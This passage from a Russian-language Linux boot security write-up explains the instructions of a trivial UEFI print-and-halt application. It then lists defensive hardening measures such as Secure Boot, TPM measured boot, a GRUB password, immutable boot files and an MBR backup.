
---

## 3. Анализ UEFI приложения

| Инструкция | Назначение |
|------------|------------|
| `mov rcx, [rdx + EFI_SYSTEM_TABLE.ConOut]` | Загрузка протокола вывода на консоль |
| `mov rdx, MSG` | Загрузка адреса сообщения |
| `call [rcx + EFI_OUTPUT.print]` | Вызов функции печати |
| `jmp $` | Бесконечный цикл |

---

## 4. Рекомендации по защите

### 4.1 Защита цепочки загрузки

| Мера | Реализация |
|------|------------|
| **Secure Boot** | Включить UEFI Secure Boot |
| **Measured Boot** | TPM 2.0 с политикой PCR |
| **Пароль GRUB** | Установить `superusers` и пароль в `grub.cfg` |
| **Read-only ESP** | Монтировать ESP как read-only после загрузки |

### 4.2 Защита файловой системы

| Мера | Реализация |
|------|------------|
| **Неизменяемый GRUB** | `chattr +i /boot/grub/grub.cfg` |
| **Неизменяемые EFI файлы** | `chattr +i /boot/efi/EFI/*/*.efi` |
| **Мониторинг загрузочных файлов** | AIDE, Tripwire |
| **Резервное копирование MBR** | `dd if=/dev/sda of=mbr_backup.bin bs=512 count=1` |

---

<div align="center">

**[⬆ Back to Top](#-linux-boot-research-complete-technical-analysis)**

*Security Research — Linux Boot Process Analysis*

</div>
